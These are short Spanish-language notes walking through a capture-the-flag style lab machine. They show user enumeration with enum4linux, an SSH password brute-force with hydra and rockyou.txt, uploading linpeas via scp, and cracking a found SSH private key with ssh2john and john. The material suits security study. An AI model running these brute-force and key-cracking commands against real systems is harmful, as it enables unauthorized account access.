Utilizamos enum4linux, para encontrar los usuarios.
Utilizamos hydra con rockyou.txt para encontrar la contraseña.
    hydra -l jan -P /home/mobius/Documentos/Cursos/rockyou.txt ssh://10.10.253.253
Una ved dentro:
Utilizamos un programa llamado linpease, para buscar escalar privilegios:
Pasamos el programa de nuestra computadora a la victima buscando una carpeta con permisos.
utilizando el comando:
scp raiz nuestra ssh/makinavictima:/carpeta-donde-pegar-programa
Encontramos un ssh kay
    Copiamos el hash y lo pegamos en uno nuevo en nuestra maquina.   
        Nano kay_id_rsa
        Le damos permisos 600
    Lo pasamos a txt con john:
        ssh2john.py archivoKay > nuevo.txt
    Crackeamos para obtener el passwd ssh:
        john forjohn.txt --wordlist=/home/mobius/Documentos/Cursos/rockyou.txt 
                                   


